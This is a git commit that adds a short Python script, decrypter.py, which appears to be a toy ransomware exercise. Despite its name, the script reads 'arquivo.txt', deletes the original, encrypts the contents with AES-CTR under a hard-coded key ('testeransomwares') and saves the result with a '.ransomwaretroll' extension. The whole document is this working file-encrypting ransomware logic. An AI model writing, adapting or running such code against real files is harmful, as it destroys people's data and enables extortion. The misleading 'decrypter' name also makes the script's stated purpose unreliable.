f512787060a3e92e39ba63a5ed7e13119c065ab8
Patrick Augusto <79328506+Patrick-Augusto@users.noreply.github.com>
2023-03-21 00:07:06 -0300

    Create decrypter.py

---
+++ decrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+
+file_name = "arquivo.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+
+os.remove(file_name)
+
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+
+crypto_data = aes.encrypt(file_data)
+
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
